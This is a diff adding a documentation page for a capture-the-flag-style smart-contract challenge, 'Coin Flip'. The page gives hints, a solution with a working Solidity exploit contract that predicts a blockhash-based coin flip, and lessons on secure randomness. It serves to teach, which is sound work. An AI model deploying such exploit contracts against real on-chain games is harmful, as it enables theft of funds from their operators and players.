@@ -1,0 +1,99 @@
+---
+title: "Challenge #3: Coin Flip"
+sidebar:
+    order: 3
+---
+
+import Hint from "@components/Hint.astro";
+import Solution from "@components/Solution.astro";
+import Conclusion from "@components/Conclusion.astro";
+
+In this challenge, you need to exploit the `CoinFlip` contract to predict the outcome of the coin flip 10 times in a row.
+
+## Hints
+
+<Hint index={1}>
+    The `CoinFlip` contract uses a random number to determine the outcome of a coin flip. How is this random number
+    generated? Look at the code that calculates the outcome.
+</Hint>
+
+<Hint index={2}>
+    The Solidity `block` object can provide information about the blockchain. How does the contract use `block.number`
+    and `blockhash` to determine the coin flip? Are these values predictable?
+</Hint>
+
+<Hint index={3}>
+    Consider the predictability of `block.number` and `blockhash`. Can you create a contract or a script that calculates
+    the result of the coin flip before calling the `flip` function? How can you synchronize with the block in which the
+    contract's `flip` function is executed?
+</Hint>
+
+## Solution
+
+<Solution>
+    The `CoinFlip` contract calculates the outcome of a coin flip using the following formula:
+
+    ```solidity
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+    ```
+
+    The value of `blockhash(block.number - 1)` is predictable since it refers to the hash of the previous block. This
+    allows you to calculate the result of the coin flip before calling the `flip` function.
+
+    To exploit this, you can create a helper contract that predicts the outcome and then calls the `flip` function with
+    the correct guess. Here is a sample contract:
+
+    ```solidity
+    pragma solidity ^0.6.0;
+
+    import './CoinFlip.sol';
+
+    contract CoinFlipExploit {
+    CoinFlip public coinFlipContract;
+    uint256 FACTOR = 1 << 255;
+
+    constructor(address _coinFlipAddress) public {
+    coinFlipContract = CoinFlip(_coinFlipAddress);
+}
+
+    function predictAndFlip() public {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+    coinFlipContract.flip(side);
+}
+}
+    ```
+
+    Deploy this exploit contract with the address of the `CoinFlip` contract, then repeatedly call the `predictAndFlip`
+    function to win the coin flip 10 times in a row.
+</Solution>
+
+## Conclusion
+
+<Conclusion>
+    <Fragment slot="takeaways">
+        This challenge highlights the importance of secure random number generation in smart contracts. Key takeaways
+        include:
+
+        1. The `blockhash` and `block.number` values are predictable and should not be used for secure randomness.
+        2. Understanding the implications of blockchain determinism and how miners can manipulate block attributes.
+        3. Implementing more secure methods for random number generation, such as using oracles or off-chain sources.
+
+        These concepts are crucial for developing secure smart contracts that rely on randomness.
+    </Fragment>
+
+    <Fragment slot="hacks">
+        Predictable random number generation has led to several hacks and vulnerabilities in the blockchain space. One
+        notable example is the use of predictable values like `blockhash` and `timestamp` to generate "random" numbers,
+        which attackers can exploit to their advantage.
+    </Fragment>
+
+    <Fragment slot="resources">
+        - [Solidity Documentation on Block Properties](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties) - This link provides information on block properties and their uses.
+        - [Randomness on the Blockchain](https://blog.chain.link/randomness-on-the-blockchain/) - An article discussing
+        the challenges and solutions for generating random numbers on the blockchain.
+    </Fragment>
+</Conclusion>
